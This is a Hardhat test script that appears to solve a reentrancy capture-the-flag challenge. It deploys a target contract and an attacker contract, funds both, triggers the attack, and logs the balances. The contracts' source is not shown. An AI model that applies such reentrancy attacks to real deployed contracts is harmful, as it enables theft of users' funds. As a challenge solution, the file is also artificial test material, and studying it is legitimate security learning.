import { expect } from "chai";
import { ethers } from "hardhat";

const { utils, provider } = ethers;

describe("Reentrancy", () => {
  it("Solves the challenge", async () => {
    const value = utils.parseEther("1")

    const [deployer, attacker] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Reentrancy")
    const contract = await contractFactory.connect(deployer).deploy()
    await contract.deployed()

    const attackerContractFactory = await ethers.getContractFactory("Attacker")
    const attackerContract = await attackerContractFactory.connect(attacker).deploy(contract.address)
    await attackerContract.deployed()

    const depositTx = await contract.connect(deployer).donate(deployer.address, {value})
    await depositTx.wait();

    const attackerDepositTx = await attackerContract.connect(attacker).donate({value})
    await attackerDepositTx.wait()
    
    const attackTx = await attackerContract.connect(attacker).attack()
    await attackTx.wait()

    // const legitTx = await contract.connect(attackerContract).withdraw(10)
    // await legitTx.wait()

    const balance = await provider.getBalance(contract.address)
    console.log('CONTRACT BALANCE: ', balance)
    const attackerContractBalance = await provider.getBalance(attackerContract.address)
    console.log('ATTACKER CONTRACT BALANCE:', attackerContractBalance)
    // const attackerContractBalance2 = await contract.balanceOf(attackerContract.address)
    // console.log(attackerContractBalance2)
    // const attackerBalance = await provider.getBalance(attacker.address)
    // console.log(attackerBalance)

  });
});